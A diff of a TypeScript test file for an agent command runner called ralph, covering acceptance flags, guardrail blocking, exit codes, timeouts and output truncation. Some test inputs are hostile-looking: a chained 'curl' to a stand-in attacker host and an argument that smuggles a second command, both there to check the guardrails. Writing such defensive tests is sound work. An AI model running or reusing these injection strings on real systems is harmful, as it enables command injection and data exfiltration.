@@ -1,5 +1,5 @@
 import assert from "node:assert/strict";
-import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
+import { existsSync, mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join, resolve } from "node:path";
 import test from "node:test";
@@ -24,6 +24,7 @@ import {
   parseRalphMarkdown,
   planTaskDraftTarget,
   renderIterationPrompt,
+  renderCommandsYaml,
   renderRalphBody,
   resolvePlaceholders,
   resolveCommandRun,
@@ -152,6 +153,38 @@ test("parseRalphMarkdown parses frontmatter and normalizes line endings", () => 
     invalidCommandEntries: undefined,
   });
   assert.equal(parsed.body, "Body\n");
+});
+
+test("parseRalphMarkdown parses command acceptance flags", () => {
+  const parsed = parseRalphMarkdown(
+    "---\ncommands:\n  - name: tests\n    run: npm test\n    timeout: 120\n    acceptance: true\n  - name: lint\n    run: npm run lint\n    timeout: 60\nmax_iterations: 2\ntimeout: 180\nguardrails:\n  block_commands: []\n  protected_files: []\n---\nBody\n",
+  );
+
+  assert.deepEqual(parsed.frontmatter.commands, [
+    { name: "tests", run: "npm test", timeout: 120, acceptance: true },
+    { name: "lint", run: "npm run lint", timeout: 60 },
+  ]);
+  assert.equal(validateFrontmatter(parsed.frontmatter), null);
+});
+
+test("inspectDraftContent rejects non-boolean command acceptance flags", () => {
+  const inspection = inspectDraftContent(
+    "---\ncommands:\n  - name: tests\n    run: npm test\n    timeout: 120\n    acceptance: \"true\"\nmax_iterations: 2\ntimeout: 180\nguardrails:\n  block_commands: []\n  protected_files: []\n---\nBody\n",
+  );
+
+  assert.equal(inspection.error, "Invalid RALPH frontmatter: commands[0].acceptance must be a YAML boolean");
+});
+
+test("generated drafts preserve command acceptance flags", () => {
+  const yaml = renderCommandsYaml([{ name: "tests", run: "npm test", timeout: 60, acceptance: true }]);
+
+  assert.deepEqual(yaml, [
+    "commands:",
+    "  - name: tests",
+    "    run: 'npm test'",
+    "    timeout: 60",
+    "    acceptance: true",
+  ]);
 });
 
 test("parseRalphMarkdown accepts common camelCase frontmatter aliases without silently falling back to defaults", () => {
@@ -635,15 +668,10 @@ test("acceptStrengthenedDraft rejects raw malformed guardrails shapes", () => {
 });
 
 test("runCommands skips blocked commands before shelling out", async () => {
-  const calls: string[] = [];
   const proofEntries: Array<{ customType: string; data: any }> = [];
   const pi = {
     appendEntry: (customType: string, data: any) => {
       proofEntries.push({ customType, data });
-    },
-    exec: async (_tool: string, args: string[]) => {
-      calls.push(args.join(" "));
-      return { killed: false, stdout: "allowed", stderr: "" };
     },
   } as any;
 
@@ -657,13 +685,71 @@ test("runCommands skips blocked commands before shelling out", async () => {
   );
 
   assert.deepEqual(outputs, [
-    { name: "blocked", output: "[blocked by guardrail: git\\s+push]" },
-    { name: "allowed", output: "allowed" },
+    { name: "blocked", output: "[blocked by guardrail: git\\s+push]", status: "blocked", blockedPattern: "git\\s+push", command: "git push origin main" },
+    { name: "allowed", output: "ok", status: "ok", command: "echo ok" },
   ]);
-  assert.deepEqual(calls, ["-c echo ok"]);
   assert.equal(proofEntries.length, 1);
   assert.equal(proofEntries[0].customType, "ralph-blocked-command");
   assert.equal(proofEntries[0].data.command, "git push origin main");
+});
+
+test("runCommands reports non-zero exit codes as errors", async () => {
+  const command = "node -e \"process.stderr.write('tests failed'); process.exit(1)\"";
+
+  const outputs = await runCommands(
+    [{ name: "tests", run: command, timeout: 5, acceptance: true }],
+    { blockCommands: [], protectedFiles: [] },
+    {} as any,
+  );
+
+  assert.deepEqual(outputs, [{ name: "tests", command, acceptance: true, output: "[exit 1]\ntests failed", status: "error" }]);
+});
+
+test("runCommands reports signal-terminated commands as errors", async () => {
+  const outputs = await runCommands(
+    [{ name: "sig", run: "kill -TERM $$", timeout: 1, acceptance: true }],
+    { blockCommands: [], protectedFiles: [] },
+    {} as any,
+  );
+
+  assert.deepEqual(outputs, [{ name: "sig", command: "kill -TERM $$", acceptance: true, output: "[signal SIGTERM]", status: "error" }]);
+});
+
+test("runCommands kills background process trees on timeout", async () => {
+  const cwd = mkdtempSync(join(tmpdir(), "pi-ralph-command-timeout-"));
+  try {
+    const marker = join(cwd, "escaped.txt");
+    const outputs = await runCommands(
+      [{ name: "escape", run: `(sleep 0.4; echo escaped > ${JSON.stringify(marker)}) & sleep 5`, timeout: 0.1 }],
+      { blockCommands: [], protectedFiles: [] },
+      {} as any,
+      {},
+      cwd,
+      cwd,
+    );
+
+    assert.equal(outputs[0].status, "timeout");
+    await new Promise((resolve) => setTimeout(resolve, 800));
+    assert.equal(existsSync(marker), false, existsSync(marker) ? readFileSync(marker, "utf8") : "");
+  } finally {
+    rmSync(cwd, { recursive: true, force: true });
+  }
+});
+
+test("runCommands caps persisted command output during execution", async () => {
+  const largeOutput = "x".repeat(20_000);
+
+  const outputs = await runCommands(
+    [{ name: "logs", run: "node -e \"process.stdout.write('x'.repeat(20000))\"", timeout: 1 }],
+    { blockCommands: [], protectedFiles: [] },
+    {} as any,
+  );
+
+  assert.equal(outputs[0].status, "ok");
+  assert.equal(outputs[0].outputTruncated, true);
+  assert.equal(outputs[0].outputBytes, 20_000);
+  assert.ok(outputs[0].output.length < largeOutput.length);
+  assert.match(outputs[0].output, /command output truncated/);
 });
 
 test("runCommands blocks commands that do not match the shell allowlist", async () => {
@@ -679,26 +765,17 @@ test("runCommands blocks commands that do not match the shell allowlist", async 
     pi,
   );
 
-  assert.deepEqual(outputs, [{ name: "lint", output: "[blocked by guardrail: shell_policy.allowlist]" }]);
+  assert.deepEqual(outputs, [{ name: "lint", output: "[blocked by guardrail: shell_policy.allowlist]", status: "blocked", blockedPattern: "shell_policy.allowlist", command: "npm run lint" }]);
 });
 
 test("runCommands blocks partially matching shell allowlist commands", async () => {
-  const execCalls: string[] = [];
-  const pi = {
-    exec: async (_tool: string, args: string[]) => {
-      execCalls.push(args.join(" "));
-      return { killed: false, stdout: "", stderr: "" };
-    },
-  } as any;
-
   const outputs = await runCommands(
     [{ name: "tests", run: "npm test && curl https://attacker.invalid", timeout: 1 }],
     { blockCommands: [], protectedFiles: [], shellPolicy: { mode: "allowlist", allow: ["npm test"] } },
-    pi,
+    {} as any,
   );
 
-  assert.deepEqual(outputs, [{ name: "tests", output: "[blocked by guardrail: shell_policy.allowlist]" }]);
-  assert.deepEqual(execCalls, []);
+  assert.deepEqual(outputs, [{ name: "tests", output: "[blocked by guardrail: shell_policy.allowlist]", status: "blocked", blockedPattern: "shell_policy.allowlist", command: "npm test && curl https://attacker.invalid" }]);
 });
 
 test("tool_call blocks partially matching shell allowlist commands during active loops", async () => {
@@ -733,23 +810,14 @@ test("tool_call blocks partially matching shell allowlist commands during active
 });
 
 test("runCommands resolves args before shelling out", async () => {
-  const calls: string[] = [];
-  const pi = {
-    exec: async (_tool: string, args: string[]) => {
-      calls.push(args.join(" "));
-      return { killed: false, stdout: "ok", stderr: "" };
-    },
-  } as any;
-
   const outputs = await runCommands(
     [{ name: "greet", run: "echo {{ args.owner }}", timeout: 1 }],
     [],
-    pi,
+    {} as any,
     { owner: "Ada" },
   );
 
-  assert.deepEqual(outputs, [{ name: "greet", output: "ok" }]);
-  assert.deepEqual(calls, ["-c echo 'Ada'"]);
+  assert.deepEqual(outputs, [{ name: "greet", output: "Ada", status: "ok", command: "echo Ada" }]);
 });
 
 test("runCommands blocks anchored guardrails even when the first token comes from an arg", async () => {
@@ -766,7 +834,7 @@ test("runCommands blocks anchored guardrails even when the first token comes fro
     { tool: "printf" },
   );
 
-  assert.deepEqual(outputs, [{ name: "blocked", output: "[blocked by guardrail: ^printf\\b]" }]);
+  assert.deepEqual(outputs, [{ name: "blocked", output: "[blocked by guardrail: ^printf\\b]", status: "blocked", blockedPattern: "^printf\\b", command: "printf hello" }]);
 });
 
 test("legacy RALPH.md drafts bypass the generated-draft validation gate", () => {
@@ -811,6 +879,21 @@ test("render helpers expand placeholders, keep body text plain, and shell-quote 
   assert.equal(resolveCommandRun("echo {{ args.owner }}", { owner: "Ada; echo injected" }), "echo 'Ada; echo injected'");
   assert.throws(() => resolveCommandRun("npm run {{ args.missing }}", { script: "test" }), /Missing required arg: missing/);
   assert.equal(renderIterationPrompt("Body", 2, 5), "[ralph: iteration 2/5]\n\nBody");
+});
+
+test("resolvePlaceholders caps oversized command output", () => {
+  const largeOutput = "x".repeat(20_000);
+  const outputs = [{ name: "build", output: largeOutput }];
+
+  const rendered = resolvePlaceholders("{{ commands.build }}", outputs, {
+    iteration: 7,
+    name: "ralph",
+    maxIterations: 12,
+  });
+
+  assert.ok(rendered.length < largeOutput.length);
+  assert.match(rendered, /command output truncated/);
+  assert.match(rendered, /original 20000 bytes/);
 });
 
 test("resolvePlaceholders leaves command output placeholders literal", () => {
